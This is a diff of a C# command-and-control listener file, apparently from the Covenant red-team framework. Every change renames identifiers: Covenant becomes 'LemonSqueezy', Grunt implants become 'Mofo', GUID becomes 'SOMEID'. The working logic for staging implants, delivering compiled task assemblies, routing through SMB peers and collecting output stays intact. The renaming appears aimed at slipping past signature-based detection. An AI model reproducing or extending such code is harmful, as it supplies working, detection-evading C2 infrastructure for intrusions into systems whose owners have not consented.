@@ -15,11 +15,11 @@ using Microsoft.CodeAnalysis;
 using Microsoft.AspNetCore.SignalR.Client;
 using Newtonsoft.Json;
 
-using Covenant.Core;
-using Covenant.API;
-using APIModels = Covenant.API.Models;
+using LemonSqueezy.Core;
+using LemonSqueezy.API;
+using APIModels = LemonSqueezy.API.Models;
 
-namespace Covenant.Models.Listeners
+namespace LemonSqueezy.Models.Listeners
 {
     public class InternalListener
     {
@@ -35,20 +35,20 @@ namespace Covenant.Models.Listeners
         public event EventHandler<NewMessageArgs> OnNewMessage = delegate { };
 
         private HubConnection _connection;
-        private ICovenantAPI _client;
+        private ILemonSqueezyAPI _client;
         private ProfileTransformAssembly _transform;
         private readonly ModelUtilities _utilities = new ModelUtilities();
 
-        internal enum GruntMessageCacheStatus
+        internal enum MofoMessageCacheStatus
         {
             Ok,
             NotFound
         }
-        internal class GruntMessageCacheInfo
+        internal class MofoMessageCacheInfo
         {
-            public APIModels.GruntTasking Tasking { get; set; }
+            public APIModels.MofoTasking Tasking { get; set; }
             public string Message { get; set; }
-            public GruntMessageCacheStatus Status { get; set; }
+            public MofoMessageCacheStatus Status { get; set; }
         }
 
         internal class ProfileTransformAssembly
@@ -59,16 +59,16 @@ namespace Covenant.Models.Listeners
 
         private readonly object _hashCodesLock = new object();
         private readonly HashSet<int> CacheTaskHashCodes = new HashSet<int>();
-        private ConcurrentDictionary<string, ConcurrentQueue<GruntMessageCacheInfo>> GruntMessageCache { get; set; } = new ConcurrentDictionary<string, ConcurrentQueue<GruntMessageCacheInfo>>();
+        private ConcurrentDictionary<string, ConcurrentQueue<MofoMessageCacheInfo>> MofoMessageCache { get; set; } = new ConcurrentDictionary<string, ConcurrentQueue<MofoMessageCacheInfo>>();
 
         public InternalListener()
         {
 
         }
 
-        public InternalListener(APIModels.Profile profile, string ListenerGuid, string CovenantUrl, string CovenantToken)
+        public InternalListener(APIModels.Profile profile, string ListenerGuid, string LemonSqueezyUrl, string LemonSqueezyToken)
         {
-            _ = Configure(profile, ListenerGuid, CovenantUrl, CovenantToken);
+            _ = Configure(profile, ListenerGuid, LemonSqueezyUrl, LemonSqueezyToken);
         }
 
         public class AlwaysRetryPolicy : IRetryPolicy
@@ -87,13 +87,13 @@ namespace Covenant.Models.Listeners
             }
         }
 
-        public async Task Configure(APIModels.Profile profile, string ListenerGuid, string CovenantUrl, string CovenantToken)
+        public async Task Configure(APIModels.Profile profile, string ListenerGuid, string LemonSqueezyUrl, string LemonSqueezyToken)
         {
             _transform = new ProfileTransformAssembly
             {
                 ProfileTransformBytes = Compiler.Compile(new Compiler.CsharpFrameworkCompilationRequest
                 {
-                    Language = Grunts.ImplantLanguage.CSharp,
+                    Language = Mofos.ImplantLanguage.CSharp,
                     Source = profile.MessageTransform,
                     TargetDotNetVersion = Common.DotNetVersion.NetCore31,
                     References = Common.DefaultReferencesNetCore,
@@ -101,7 +101,7 @@ namespace Covenant.Models.Listeners
                 })
             };
 
-            X509Certificate2 covenantCert = new X509Certificate2(Common.CovenantPublicCertFile);
+            X509Certificate2 covenantCert = new X509Certificate2(Common.LemonSqueezyPublicCertFile);
             HttpClientHandler clientHandler = new HttpClientHandler
             {
                 ServerCertificateCustomValidationCallback = (sender, cert, chain, errors) =>
@@ -109,16 +109,16 @@ namespace Covenant.Models.Listeners
                     return cert.GetCertHashString() == covenantCert.GetCertHashString();
                 }
             };
-            _client = new CovenantAPI(
-                new Uri(CovenantUrl),
-                new TokenCredentials(CovenantToken),
+            _client = new LemonSqueezyAPI(
+                new Uri(LemonSqueezyUrl),
+                new TokenCredentials(LemonSqueezyToken),
                 clientHandler
             );
 
             _connection = new HubConnectionBuilder()
-                .WithUrl(CovenantUrl + "/gruntHub", options =>
+                .WithUrl(LemonSqueezyUrl + "/mofoHub", options =>
                 {
-                    options.AccessTokenProvider = () => { return Task.FromResult(CovenantToken); };
+                    options.AccessTokenProvider = () => { return Task.FromResult(LemonSqueezyToken); };
                     options.HttpMessageHandlerFactory = inner =>
                     {
                         var HttpClientHandler = (HttpClientHandler)inner;
@@ -134,9 +134,9 @@ namespace Covenant.Models.Listeners
                 await Task.Delay(5000);
                 await _connection.StartAsync();
                 await _connection.InvokeAsync("JoinGroup", ListenerGuid);
-                _connection.On<string>("NotifyListener", (guid) =>
+                _connection.On<string>("NotifyListener", (someid) =>
                 {
-                    InternalRead(guid).Wait();
+                    InternalRead(someid).Wait();
                 });
             }
             catch (Exception e)
@@ -157,73 +157,73 @@ namespace Covenant.Models.Listeners
             };
         }
 
-        private ModelUtilities.GruntEncryptedMessage CreateMessageForGrunt(APIModels.Grunt grunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntTaskingMessage taskingMessage)
+        private ModelUtilities.MofoEncMsg CreateMessageForMofo(APIModels.Mofo mofo, APIModels.Mofo targetMofo, ModelUtilities.MofoTaskingMessage taskingMessage)
         {
-            return this.CreateMessageForGrunt(grunt, targetGrunt, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(taskingMessage)));
+            return this.CreateMessageForMofo(mofo, targetMofo, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(taskingMessage)));
         }
 
-        private ModelUtilities.GruntEncryptedMessage CreateMessageForGrunt(APIModels.Grunt grunt, APIModels.Grunt targetGrunt, byte[] message)
+        private ModelUtilities.MofoEncMsg CreateMessageForMofo(APIModels.Mofo mofo, APIModels.Mofo targetMofo, byte[] message)
         {
-            List<string> path = _client.GetPathToChildGrunt(grunt.Id ?? default, targetGrunt.Id ?? default).ToList();
+            List<string> path = _client.GetPathToChildMofo(mofo.Id ?? default, targetMofo.Id ?? default).ToList();
             path.Reverse();
-            ModelUtilities.GruntEncryptedMessage finalMessage = null;
-            ModelUtilities.GruntEncryptedMessageType messageType = ModelUtilities.GruntEncryptedMessageType.Tasking;
-            foreach (string guid in path)
+            ModelUtilities.MofoEncMsg finalMessage = null;
+            ModelUtilities.MofoEncMsgType messageType = ModelUtilities.MofoEncMsgType.Tasking;
+            foreach (string someid in path)
             {
-                APIModels.Grunt thisGrunt = _client.GetGruntByGUID(guid);
-                finalMessage = ModelUtilities.GruntEncryptedMessage.Create(
-                    thisGrunt,
+                APIModels.Mofo thisMofo = _client.GetMofoBySOMEID(someid);
+                finalMessage = ModelUtilities.MofoEncMsg.Create(
+                    thisMofo,
                     message,
                     messageType
                 );
-                message = Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(finalMessage));
-                messageType = ModelUtilities.GruntEncryptedMessageType.Routing;
+                message = Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(finalMessage));
+                messageType = ModelUtilities.MofoEncMsgType.Routing;
             }
             return finalMessage;
         }
 
         private byte[] GetCompressedILAssembly35(string taskname)
         {
-            return File.ReadAllBytes(Common.CovenantTaskCSharpCompiledNet35Directory + taskname + ".compiled");
+            return File.ReadAllBytes(Common.LemonSqueezyTaskCSharpCompiledNet35Directory + taskname + ".compiled");
         }
 
         private byte[] GetCompressedILAssembly40(string taskname)
         {
-            return File.ReadAllBytes(Common.CovenantTaskCSharpCompiledNet40Directory + taskname + ".compiled");
+            return File.ReadAllBytes(Common.LemonSqueezyTaskCSharpCompiledNet40Directory + taskname + ".compiled");
         }
 
         private byte[] GetCompressedILAssembly30(string taskname)
         {
-            return File.ReadAllBytes(Common.CovenantTaskCSharpCompiledNetCoreApp30Directory + taskname + ".compiled");
+            return File.ReadAllBytes(Common.LemonSqueezyTaskCSharpCompiledNetCoreApp30Directory + taskname + ".compiled");
         }
 
-        private ModelUtilities.GruntTaskingMessage GetGruntTaskingMessage(APIModels.GruntTasking tasking, APIModels.DotNetVersion version)
+        private ModelUtilities.MofoTaskingMessage GetMofoTaskingMessage(APIModels.MofoTasking tasking, APIModels.DotNetVersion version)
         {
             string Message = "";
-            if (tasking.Type == APIModels.GruntTaskingType.Assembly)
+            if (tasking.Type == APIModels.MofoTaskingType.Assembly)
             {
                 if (version == APIModels.DotNetVersion.Net35)
                 {
-                    Message = Convert.ToBase64String(this.GetCompressedILAssembly35(tasking.GruntTask.Name));
+                    Message = Convert.ToBase64String(this.GetCompressedILAssembly35(tasking.MofoTask.Name));
                     if (tasking.Parameters.Any())
                     {
-                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
+                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.LemonSqueezyEncoding.GetBytes(P))));
                     }
                 }
                 else if (version == APIModels.DotNetVersion.Net40)
                 {
-                    Message = Convert.ToBase64String(this.GetCompressedILAssembly40(tasking.GruntTask.Name));
+                    Message = Convert.ToBase64String(this.GetCompressedILAssembly40(tasking.MofoTask.Name));
                     if (tasking.Parameters.Any())
                     {
-                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
+                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.LemonSqueezyEncoding.GetBytes(P))));
                     }
                 }
                 else if (version == APIModels.DotNetVersion.NetCore31)
                 {
-                    Message = Convert.ToBase64String(this.GetCompressedILAssembly30(tasking.GruntTask.Name));
+                    Message = Convert.ToBase64String(this.GetCompressedILAssembly30(tasking.MofoTask.Name));
                     if (tasking.Parameters.Any())
                     {
-                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.CovenantEncoding.GetBytes(P))));
+                        Message += "," + String.Join(",", tasking.Parameters.Select(P => Convert.ToBase64String(Common.LemonSqueezyEncoding.GetBytes(P))));
                     }
                 }
             }
@@ -231,50 +231,50 @@ namespace Covenant.Models.Listeners
             {
                 Message = string.Join(",", tasking.Parameters);
             }
-            return new ModelUtilities.GruntTaskingMessage
+            return new ModelUtilities.MofoTaskingMessage
             {
                 Type = tasking.Type,
                 Name = tasking.Name,
                 Message = Message,
-                Token = tasking.GruntTask == null ? false : tasking.GruntTask.TokenTask
+                Token = tasking.MofoTask == null ? false : tasking.MofoTask.TokenTask
             };
         }
 
-        private int GetTaskingHashCode(APIModels.GruntTasking tasking)
+        private int GetTaskingHashCode(APIModels.MofoTasking tasking)
         {
             if (tasking != null)
             {
                 int code = tasking.Id ?? default;
-                code ^= tasking.GruntId;
-                code ^= tasking.GruntTaskId;
-                code ^= tasking.GruntCommandId ?? default;
+                code ^= tasking.MofoId;
+                code ^= tasking.MofoTaskId;
+                code ^= tasking.MofoCommandId ?? default;
                 foreach (char c in tasking.Name) { code ^= c; }
                 return code;
             }
             return Guid.NewGuid().GetHashCode();
         }
 
-        private int GetCacheEntryHashCode(GruntMessageCacheInfo cacheEntry)
+        private int GetCacheEntryHashCode(MofoMessageCacheInfo cacheEntry)
         {
             return GetTaskingHashCode(cacheEntry.Tasking);
         }
 
-        private void PushCache(string guid, GruntMessageCacheInfo cacheEntry)
+        private void PushCache(string someid, MofoMessageCacheInfo cacheEntry)
         {
-            if (this.GruntMessageCache.TryGetValue(guid, out ConcurrentQueue<GruntMessageCacheInfo> cacheQueue))
+            if (this.MofoMessageCache.TryGetValue(someid, out ConcurrentQueue<MofoMessageCacheInfo> cacheQueue))
             {
                 lock (_hashCodesLock)
                 {
                     if (this.CacheTaskHashCodes.Add(GetCacheEntryHashCode(cacheEntry)))
                     {
                         cacheQueue.Enqueue(cacheEntry);
-                        this.OnNewMessage(this, new NewMessageArgs(guid));
+                        this.OnNewMessage(this, new NewMessageArgs(someid));
                     }
                 }
             }
             else
             {
-                cacheQueue = new ConcurrentQueue<GruntMessageCacheInfo>();
+                cacheQueue = new ConcurrentQueue<MofoMessageCacheInfo>();
                 lock (_hashCodesLock)
                 {
                     if (this.CacheTaskHashCodes.Add(GetCacheEntryHashCode(cacheEntry)))
@@ -282,117 +282,117 @@ namespace Covenant.Models.Listeners
                         cacheQueue.Enqueue(cacheEntry);
                     }
                 }
-                this.GruntMessageCache[guid] = cacheQueue;
-                this.OnNewMessage(this, new NewMessageArgs(guid));
+                this.MofoMessageCache[someid] = cacheQueue;
+                this.OnNewMessage(this, new NewMessageArgs(someid));
             }
         }
 
-        private async Task<APIModels.Grunt> GetGruntForGuid(string guid)
+        private async Task<APIModels.Mofo> GetMofoForGuid(string someid)
         {
             try
             {
-                if (!string.IsNullOrEmpty(guid))
+                if (!string.IsNullOrEmpty(someid))
                 {
-                    return await _client.GetGruntByGUIDAsync(guid);
+                    return await _client.GetMofoBySOMEIDAsync(someid);
                 }
             }
             catch (Exception) { }
             return null;
         }
 
-        private async Task<APIModels.Grunt> CheckInGrunt(APIModels.Grunt grunt)
+        private async Task<APIModels.Mofo> CheckInMofo(APIModels.Mofo mofo)
         {
-            if (grunt == null)
+            if (mofo == null)
             {
                 return null;
             }
-            grunt.LastCheckIn = DateTime.UtcNow;
-            return await _client.EditGruntAsync(grunt);
+            mofo.LastCheckIn = DateTime.UtcNow;
+            return await _client.EditMofoAsync(mofo);
         }
 
-        private async Task<APIModels.GruntTasking> MarkTasked(APIModels.GruntTasking tasking)
+        private async Task<APIModels.MofoTasking> MarkTasked(APIModels.MofoTasking tasking)
         {
             if (tasking == null)
             {
                 return null;
             }
-            tasking.Status = APIModels.GruntTaskingStatus.Tasked;
+            tasking.Status = APIModels.MofoTaskingStatus.Tasked;
             tasking.TaskingTime = DateTime.UtcNow;
-            return await _client.EditGruntTaskingAsync(tasking);
+            return await _client.EditMofoTaskingAsync(tasking);
         }
 
-        public async Task<string> Read(string guid)
+        public async Task<string> Read(string someid)
         {
-            if (string.IsNullOrEmpty(guid))
+            if (string.IsNullOrEmpty(someid))
             {
                 return "";
             }
-            await CheckInGrunt(await GetGruntForGuid(guid));
-            if (this.GruntMessageCache.TryGetValue(guid, out ConcurrentQueue<GruntMessageCacheInfo> cache))
+            await CheckInMofo(await GetMofoForGuid(someid));
+            if (this.MofoMessageCache.TryGetValue(someid, out ConcurrentQueue<MofoMessageCacheInfo> cache))
             {
-                if (cache.TryDequeue(out GruntMessageCacheInfo cacheEntry))
+                if (cache.TryDequeue(out MofoMessageCacheInfo cacheEntry))
                 {
                     switch (cacheEntry.Status)
                     {
-                        case GruntMessageCacheStatus.NotFound:
+                        case MofoMessageCacheStatus.NotFound:
                             await this.MarkTasked(cacheEntry.Tasking);
                             throw new ControllerNotFoundException(cacheEntry.Message);
-                        case GruntMessageCacheStatus.Ok:
+                        case MofoMessageCacheStatus.Ok:
                             await this.MarkTasked(cacheEntry.Tasking);
                             return cacheEntry.Message;
                     }
                 }
                 return "";
             }
-            await InternalRead(guid);
+            await InternalRead(someid);
             return "";
         }
 
-        private async Task InternalRead(string guid)
+        private async Task InternalRead(string someid)
         {
             try
             {
-                APIModels.Grunt temp = await GetGruntForGuid(guid);
-                APIModels.Grunt grunt = await CheckInGrunt(temp);
-                if (grunt == null)
+                APIModels.Mofo temp = await GetMofoForGuid(someid);
+                APIModels.Mofo mofo = await CheckInMofo(temp);
+                if (mofo == null)
                 {
-                    // Invalid GUID. May not be legitimate Grunt request, respond Ok
-                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = "" });
+                    // Invalid SOMEID. May not be legitimate Mofo request, respond Ok
+                    this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = "" });
                 }
                 else
                 {
-                    IList<APIModels.GruntTasking> gruntTaskings = await _client.GetSearchUninitializedGruntTaskingsAsync(grunt.Id ?? default);
-                    if (gruntTaskings == null || gruntTaskings.Count == 0)
+                    IList<APIModels.MofoTasking> mofoTaskings = await _client.GetSearchUninitializedMofoTaskingsAsync(mofo.Id ?? default);
+                    if (mofoTaskings == null || mofoTaskings.Count == 0)
                     {
-                        // No GruntTasking assigned. Respond with empty template
-                        this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = "" });
+                        // No MofoTasking assigned. Respond with empty template
+                        this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = "" });
                     }
                     else
                     {
-                        foreach (APIModels.GruntTasking tasking in gruntTaskings)
+                        foreach (APIModels.MofoTasking tasking in mofoTaskings)
                         {
-                            APIModels.GruntTasking gruntTasking = tasking;
-                            if (gruntTasking.Type == APIModels.GruntTaskingType.Assembly && gruntTasking.GruntTask == null)
+                            APIModels.MofoTasking mofoTasking = tasking;
+                            if (mofoTasking.Type == APIModels.MofoTaskingType.Assembly && mofoTasking.MofoTask == null)
                             {
                                 // Can't find corresponding task. Should never reach this point. Will just respond NotFound.
-                                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = gruntTasking });
+                                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = mofoTasking });
                             }
                             else
                             {
-                                gruntTasking.Grunt = gruntTasking.GruntId == grunt.Id ? grunt : await _client.GetGruntAsync(gruntTasking.GruntId);
-                                ModelUtilities.GruntEncryptedMessage message = null;
+                                mofoTasking.Mofo = mofoTasking.MofoId == mofo.Id ? mofo : await _client.GetMofoAsync(mofoTasking.MofoId);
+                                ModelUtilities.MofoEncMsg message = null;
                                 try
                                 {
-                                    message = this.CreateMessageForGrunt(grunt, gruntTasking.Grunt, this.GetGruntTaskingMessage(gruntTasking, gruntTasking.Grunt.DotNetVersion));
+                                    message = this.CreateMessageForMofo(mofo, mofoTasking.Mofo, this.GetMofoTaskingMessage(mofoTasking, mofoTasking.Mofo.DotNetVersion));
                                     // Transform response
-                                    string transformed = this._utilities.ProfileTransform(_transform, Common.CovenantEncoding.GetBytes(JsonConvert.SerializeObject(message)));
-                                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.Ok, Message = transformed, Tasking = gruntTasking });
+                                    string transformed = this._utilities.ProfileTransform(_transform, Common.LemonSqueezyEncoding.GetBytes(JsonConvert.SerializeObject(message)));
+                                    this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.Ok, Message = transformed, Tasking = mofoTasking });
                                 }
                                 catch (HttpOperationException)
                                 {
-                                    gruntTasking.Status = APIModels.GruntTaskingStatus.Aborted;
-                                    await _client.EditGruntTaskingAsync(gruntTasking);
-                                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                                    mofoTasking.Status = APIModels.MofoTaskingStatus.Aborted;
+                                    await _client.EditMofoTaskingAsync(mofoTasking);
+                                    this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                                 }
                             }
                         }
@@ -401,121 +401,121 @@ namespace Covenant.Models.Listeners
             }
             catch (Exception)
             {
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "" });
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "" });
             }
         }
 
-        public async Task<string> Write(string guid, string data)
+        public async Task<string> Write(string someid, string data)
         {
             try
             {
-                ModelUtilities.GruntEncryptedMessage message = null;
+                ModelUtilities.MofoEncMsg message = null;
                 try
                 {
-                    string inverted = Common.CovenantEncoding.GetString(this._utilities.ProfileInvert(_transform, data));
-                    message = JsonConvert.DeserializeObject<ModelUtilities.GruntEncryptedMessage>(inverted);
+                    string inverted = Common.LemonSqueezyEncoding.GetString(this._utilities.ProfileInvert(_transform, data));
+                    message = JsonConvert.DeserializeObject<ModelUtilities.MofoEncMsg>(inverted);
                 }
                 catch (Exception)
                 {
-                    // Request not formatted correctly. May not be legitimate Grunt request, respond NotFound
-                    this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
-                    return guid;
+                    // Request not formatted correctly. May not be legitimate Mofo request, respond NotFound
+                    this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                    return someid;
                 }
-                APIModels.Grunt egressGrunt;
+                APIModels.Mofo egressMofo;
                 try
                 {
-                    egressGrunt = guid == null ? null : await _client.GetGruntByGUIDAsync(guid);
+                    egressMofo = someid == null ? null : await _client.GetMofoBySOMEIDAsync(someid);
                 }
                 catch (HttpOperationException)
                 {
-                    egressGrunt = null;
+                    egressMofo = null;
                 }
-                APIModels.Grunt targetGrunt = null;
+                APIModels.Mofo targetMofo = null;
                 try
                 {
-                    targetGrunt = await _client.GetGruntByGUIDAsync(message.GUID);
+                    targetMofo = await _client.GetMofoBySOMEIDAsync(message.SOMEID);
                 }
                 catch (HttpOperationException)
                 {
-                    targetGrunt = null;
+                    targetMofo = null;
                     // Stage0 Guid is OriginalServerGuid + Guid
-                    if (message.GUID.Length == 20)
+                    if (message.SOMEID.Length == 20)
                     {
-                        string originalServerGuid = message.GUID.Substring(0, 10);
-                        guid = message.GUID.Substring(10, 10);
-                        targetGrunt = await _client.GetGruntByOriginalServerGUIDAsync(originalServerGuid);
-                        if (targetGrunt != null)
+                        string originalServerGuid = message.SOMEID.Substring(0, 10);
+                        someid = message.SOMEID.Substring(10, 10);
+                        targetMofo = await _client.GetMofoByOriginalServerSOMEIDAsync(originalServerGuid);
+                        if (targetMofo != null)
                         {
-                            var it = await _client.GetImplantTemplateAsync(targetGrunt.ImplantTemplateId);
-                            if (egressGrunt == null && it.CommType == APIModels.CommunicationType.SMB)
+                            var it = await _client.GetImplantTemplateAsync(targetMofo.ImplantTemplateId);
+                            if (egressMofo == null && it.CommType == APIModels.CommunicationType.SMB)
                             {
-                                // Get connecting Grunt as egress
-                                List<APIModels.GruntTasking> taskings = (await _client.GetAllGruntTaskingsAsync()).ToList();
-                                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ guid of some sort?
-                                APIModels.GruntTasking connectTasking = taskings
-                                    .Where(GT => GT.Type == APIModels.GruntTaskingType.Connect &&
-                                            (GT.Status == APIModels.GruntTaskingStatus.Progressed || GT.Status == APIModels.GruntTaskingStatus.Tasked))
+                                // Get connecting Mofo as egress
+                                List<APIModels.MofoTasking> taskings = (await _client.GetAllMofoTaskingsAsync()).ToList();
+                                // TODO: Finding the connectTasking this way could cause race conditions, should fix w/ someid of some sort?
+                                APIModels.MofoTasking connectTasking = taskings
+                                    .Where(GT => GT.Type == APIModels.MofoTaskingType.Connect &&
+                                            (GT.Status == APIModels.MofoTaskingStatus.Progressed || GT.Status == APIModels.MofoTaskingStatus.Tasked))
                                     .Reverse()
                                     .FirstOrDefault();
                                 if (connectTasking == null)
                                 {
-                                    egressGrunt = null;
+                                    egressMofo = null;
                                 }
                                 else
                                 {
-                                    APIModels.Grunt taskedGrunt = await _client.GetGruntAsync(connectTasking.GruntId);
-                                    egressGrunt ??= await _client.GetOutboundGruntAsync(taskedGrunt.Id ?? default);
+                                    APIModels.Mofo taskedMofo = await _client.GetMofoAsync(connectTasking.MofoId);
+                                    egressMofo ??= await _client.GetOutboundMofoAsync(taskedMofo.Id ?? default);
                                 }
                             }
                         }
-                        await this.PostStage0(egressGrunt, targetGrunt, message, message.GUID.Substring(10), guid);
-                        return guid;
+                        await this.PostStage0(egressMofo, targetMofo, message, message.SOMEID.Substring(10), someid);
+                        return someid;
                     }
                     else
                     {
-                        this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
-                        return guid;
+                        this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                        return someid;
                     }
                 }
 
-                switch (targetGrunt.Status)
+                switch (targetMofo.Status)
                 {
-                    case APIModels.GruntStatus.Uninitialized:
-                        await this.PostStage0(egressGrunt, targetGrunt, message, guid, guid);
-                        return guid;
-                    case APIModels.GruntStatus.Stage0:
-                        await this.PostStage1(egressGrunt, targetGrunt, message, guid);
-                        return guid;
-                    case APIModels.GruntStatus.Stage1:
-                        await this.PostStage2(egressGrunt, targetGrunt, message, guid);
-                        return guid;
-                    case APIModels.GruntStatus.Stage2:
-                        await this.RegisterGrunt(egressGrunt, targetGrunt, message, guid);
-                        return guid;
-                    case APIModels.GruntStatus.Active:
-                        await this.PostTask(egressGrunt, targetGrunt, message, egressGrunt.Guid);
-                        return guid;
-                    case APIModels.GruntStatus.Lost:
-                        await this.PostTask(egressGrunt, targetGrunt, message, egressGrunt.Guid);
-                        return guid;
+                    case APIModels.MofoStatus.Uninitialized:
+                        await this.PostStage0(egressMofo, targetMofo, message, someid, someid);
+                        return someid;
+                    case APIModels.MofoStatus.Stage0:
+                        await this.PostStage1(egressMofo, targetMofo, message, someid);
+                        return someid;
+                    case APIModels.MofoStatus.Stage1:
+                        await this.PostStage2(egressMofo, targetMofo, message, someid);
+                        return someid;
+                    case APIModels.MofoStatus.Stage2:
+                        await this.RegisterMofo(egressMofo, targetMofo, message, someid);
+                        return someid;
+                    case APIModels.MofoStatus.Active:
+                        await this.PostTask(egressMofo, targetMofo, message, egressMofo.Guid);
+                        return someid;
+                    case APIModels.MofoStatus.Lost:
+                        await this.PostTask(egressMofo, targetMofo, message, egressMofo.Guid);
+                        return someid;
                     default:
-                        this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
-                        return guid;
+                        this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                        return someid;
                 }
             }
             catch
             {
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
-                return guid;
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                return someid;
             }
         }
 
-        private async Task PostTask(APIModels.Grunt egressGrunt, APIModels.Grunt targetGrunt, ModelUtilities.GruntEncryptedMessage outputMessage, string guid)
+        private async Task PostTask(APIModels.Mofo egressMofo, APIModels.Mofo targetMofo, ModelUtilities.MofoEncMsg outputMessage, string someid)
         {
-            if (targetGrunt == null || egressGrunt == null || egressGrunt.Guid != guid)
+            if (targetMofo == null || egressMofo == null || egressMofo.Guid != someid)
             {
-                // Invalid GUID. May not be legitimate Grunt request, respond NotFound
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                // Invalid SOMEID. May not be legitimate Mofo request, respond NotFound
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
 
@@ -523,297 +523,297 @@ namespace Covenant.Models.Listeners
             if (string.IsNullOrWhiteSpace(TaskName))
             {
                 // Invalid task response. This happens on post-register write
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            APIModels.GruntTasking gruntTasking;
+            APIModels.MofoTasking mofoTasking;
             try
             {
-                gruntTasking = await _client.GetGruntTaskingByNameAsync(TaskName);
+                mofoTasking = await _client.GetMofoTaskingByNameAsync(TaskName);
             }
             catch (HttpOperationException)
             {
-                // Invalid taskname. May not be legitimate Grunt request, respond NotFound
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                // Invalid taskname. May not be legitimate Mofo request, respond NotFound
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
 
-            if (targetGrunt == null)
+            if (targetMofo == null)
             {
-                // Invalid Grunt. May not be legitimate Grunt request, respond NotFound
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                // Invalid Mofo. May not be legitimate Mofo request, respond NotFound
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            if (!outputMessage.VerifyHMAC(Convert.FromBase64String(targetGrunt.GruntNegotiatedSessionKey)))
+            if (!outputMessage.VerifyHMAC(Convert.FromBase64String(targetMofo.MofoNegotiatedSessKEy)))
             {
-                // Invalid signature. Almost certainly not a legitimate Grunt request, respond NotFound
-                this.PushCache(guid, new GruntMessageCacheInfo { Status = GruntMessageCacheStatus.NotFound, Message = "", Tasking = null });
+                // Invalid signature. Almost certainly not a legitimate Mofo request, respond NotFound
+                this.PushCache(someid, new MofoMessageCacheInfo { Status = MofoMessageCacheStatus.NotFound, Message = "", Tasking = null });
                 return;
             }
-            string taskRawResponse = Common.CovenantEncoding.GetString(_utilities.GruntSessionDecrypt(targetGrunt, outputMessage));
-            ModelUtilities.GruntTaskingMessageResponse taskResponse = JsonConvert.DeserializeObject<ModelUtilities.GruntTaskingMessageResponse>(taskRawResponse);
-            APIModels.GruntCommand command = await _client.GetGruntCommandAsync(gruntTasking.GruntCommandId ?? default);
+            string taskRawResponse = Common.LemonSqueezyEncoding.GetString(_utilities.MofoSessionDecrypt(targetMofo, outputMessage));
+            ModelUtilities.MofoTaskingMessageResponse taskResponse = JsonConvert.DeserializeObject<ModelUtilities.MofoTaskingMessageResponse>(taskRawResponse);
+            APIModels.MofoCommand command = await _client.GetMofoCommandAsync(mofoTasking.MofoCommandId ?? default);
             await _client.AppendCommandOutputAsync(command.CommandOutputId, taskResponse.Output);
 
-            gruntTasking.Status = taskResponse.Status;
-            if (gruntTasking.Status == APIModels.GruntTaskingStatus.Completed)
+            mofoTasking.Status = taskResponse.Status;
+            if (mofoTasking.Status == APIModels.MofoTaskingStatus.Completed)
             {
